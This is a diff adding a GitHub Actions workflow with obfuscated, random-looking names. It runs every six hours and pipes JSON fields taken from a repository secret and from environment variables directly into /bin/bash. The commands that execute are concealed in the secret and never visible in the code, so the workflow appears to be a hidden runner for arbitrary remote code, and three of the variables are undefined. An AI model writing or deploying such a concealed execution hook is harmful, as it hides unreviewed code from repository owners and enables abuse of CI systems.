@@ -1,0 +1,20 @@
+name: lukasa7612
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lukasa7612
+        env:
+          xsan3: ${{ secrets.xsan3 }}
+        run: |
+          echo $xsan3 | jq -r .nk642 | /bin/bash
+          echo $w479 | jq -r .qnkmd89 | /bin/bash
+          echo $o956 | jq -r .vays5103 | /bin/bash
+          echo $jyqnv19 | jq -r .v67022 | /bin/bash
+
